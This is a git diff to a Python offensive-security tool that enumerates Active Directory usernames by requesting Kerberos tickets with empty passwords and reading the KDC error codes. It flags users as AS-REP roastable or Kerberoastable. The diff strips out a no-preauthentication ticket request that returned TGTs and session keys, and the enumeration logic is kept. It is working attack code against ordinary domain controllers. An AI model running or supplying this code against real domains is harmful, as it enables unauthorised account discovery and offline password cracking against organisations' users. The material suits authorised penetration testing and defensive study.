@@ -36,37 +36,20 @@ def enumerate_user(user, domain, dc):
     dc_ip = socket.gethostbyname(dc)
     userclient = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
     try:
-        try:
-            tgt, cipher, oldSessioKey, sessionKey = getKerberosTGT(userclient,domain=domain,kdcHost=dc_ip, password='',
+        getKerberosTGT(userclient,domain=domain,kdcHost=dc_ip, password='',
                            lmhash='', nthash='')
-        except SessionError as e:
-            code = e.getErrorCode()
-            if code != 6:
-                print(f'[+] Found user: {user}@{domain}')
-                discovered.append(user)
-                return {'user':user}
-            else:
-                return None
-        except Exception as e:
+    except SessionError as e:
+        code = e.getErrorCode()
+        if code != 6:
+            print(f'[+] Found user: {user}@{domain}')
+            discovered.append(user)
+            return {'user':user}
+        else:
+            return None
+    except Exception as e:
             #print(e)
-            print(f'[+] possible kerberoastable or asrep raostable user: {user}@{domain}')
-            return {'user':user, 'tgt':tgt, 'cipher':cipher, 'oldSessionKey': oldSessioKey, 'sessionKey': sessionKey}
-    except:
-        try:
-            tgt, cipher, oldSessioKey, sessionKey = nopreauthTGT(userclient,domain=domain,kdcHost=dc_ip, password='',
-                           lmhash='', nthash='', kerberoast_no_preauth=True)
-        except SessionError as e:
-            code = e.getErrorCode()
-            if code != 6:
-                if user not in discovered:
-                    print(f'[+] Found user: {user}@{domain}')
-                return {'user':user}
-            else:
-                return None
-        except Exception as e:
-            #print(e)
-            print(f'[+] possible kerberoastable or asrep raostable user: {user}@{domain}')
-            return {'user':user, 'tgt':tgt, 'cipher':cipher, 'oldSessionKey': oldSessioKey, 'sessionKey': sessionKey}
+        print(f'[+] possible kerberoastable or asrep raostable user: {user}@{domain}')
+        return {'user':user}
         # userclient = Principal(self.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
         # try:
         #     tgt, cipher, oldSessionKey, newSessionKey = getKerberosTGT(userclient, password=self.password, 
